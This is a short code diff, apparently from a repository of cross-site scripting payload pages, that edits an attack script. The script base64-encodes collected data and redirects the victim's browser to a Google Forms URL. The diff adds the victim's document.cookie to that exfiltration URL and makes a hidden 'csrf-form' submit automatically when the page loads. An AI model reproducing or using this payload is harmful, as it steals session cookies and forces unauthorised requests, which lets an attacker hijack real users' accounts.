@@ -19,8 +19,10 @@ layout: xss
         var x = data.items.map(i => ` ${i} `).join('');
         var y = btoa(x);
         console.log(y);
-        document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + y;        
+        document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + y + ";cookie=>" + document.cookie;        
     }
+
+    document.getElementById("csrf-form").submit();
     window.open("xss2.html");
     
 </script>
